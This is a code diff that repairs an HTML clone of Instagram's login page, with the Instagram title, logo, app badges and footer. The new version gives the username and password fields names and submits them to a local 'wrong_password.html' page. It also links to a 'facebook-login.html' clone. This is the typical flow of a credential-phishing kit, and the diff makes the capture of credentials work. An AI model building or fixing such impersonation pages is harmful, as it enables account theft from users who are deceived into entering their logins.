@@ -1,90 +1,87 @@
-<!-- This is instagram login page -->
-
+<!-- Instagram Login Page (naprawiona wersja) -->
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login . Instagram</title>
-    <link rel="stylesheet" href="loginstyle.css">
-    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
-    <style>
-        img {
-            vertical-align: text-top;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login • Instagram</title>
+  <link rel="stylesheet" href="loginstyle.css" />
+  <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp" type="image/webp" />
+  <style>
+    img {
+      vertical-align: text-top;
+    }
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+    body {
+      font-family: Arial, sans-serif;
+    }
+  </style>
 </head>
 
 <body>
-    <div class="container">
-        <div class="box">
-            <div class="heading"></div>
-            <form class="login-form">
-                <div class="field">
-                    <input id="username" type="name" placeholder="Phone number, username, or email" />
-                    <label for="username">Phone number, username, or email</label>
-                </div>
-                <div class="field">
-                    <input id="password" type="password" placeholder="password" />
-                    <label for="password">Password</label>
-                </div>
-                <button class="login-button" title="login"><a href="wrong_password.html">Log In</button></a>
-                <div class="separator">
-                    <div class="line"></div>
-                    <p>OR</p>
-                    <div class="line"></div>
-                </div>
+  <div class="container">
+    <div class="box">
+      <div class="heading"></div>
+      <form class="login-form" action="wrong_password.html" method="get">
+        <div class="field">
+          <label for="username">Phone number, username, or email</label>
+          <input id="username" name="username" type="text" placeholder="Phone number, username, or email" required />
+        </div>
+        <div class="field">
+          <label for="password">Password</label>
+          <input id="password" name="password" type="password" placeholder="Password" required />
+        </div>
+        <button class="login-button" type="submit" title="Log In">Log In</button>
 
-                <div class="other">
-                    <button class="fb-login-btn" type="button">
-                        <i class="fa fa-facebook-official fb-icon"></i>
-                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
-                        </span>
-                    </button>
-                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
-                </div>
-            </form>
+        <div class="separator">
+          <div class="line"></div>
+          <p>OR</p>
+          <div class="line"></div>
         </div>
-        <div class="box">
-            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+
+        <div class="other">
+          <button class="fb-login-btn" type="button" onclick="location.href='facebook-login.html'">
+            <img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"
+                 alt="Facebook" height="15" width="15" />
+            &nbsp;Log in with Facebook
+          </button>
+          <a class="forgot-password" href="/forget.html">Forgot password?</a>
         </div>
+      </form>
     </div>
-    <br>
-    <div class="get">
-    Get the app.
+
+    <div class="box">
+      <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
     </div>
-    <br>
-    <div class="apps">
-        <a href="/forget.html">
-        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
-            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
-        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
-        </div>
-        <br>
-        <div class="footer">
-    <footer>
-            Meta
-            About
-            Blog
-            Jobs
-            Help
-            API
-            Privacy
-            Terms
-            Top Accounts
-            Hashtags
-            Locations
-            Instagram Lite
-            Contact Uploading & Non-Users
-    </footer>
-</div>
-<div class="copyright">
-    <br>    
+  </div>
+
+  <div class="get">Get the app.</div>
+
+  <div class="apps">
+    <a href="/forget.html">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
+           alt="Get it on Google Play" height="40" width="134" />
+    </a>
+    &nbsp;&nbsp;&nbsp;
+    <a href="/forget.html">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+           alt="Get it from Microsoft" height="40" width="134" />
+    </a>
+  </div>
+
+  <footer class="footer">
+    <p>
+      Meta • About • Blog • Jobs • Help • API • Privacy • Terms • Top Accounts •
+      Hashtags • Locations • Instagram Lite • Contact Uploading & Non-Users
+    </p>
+  </footer>
+
+  <div class="copyright">
     English © 2022 Instagram from Meta
-</div>
-    
+  </div>
 </body>
-
 </html>
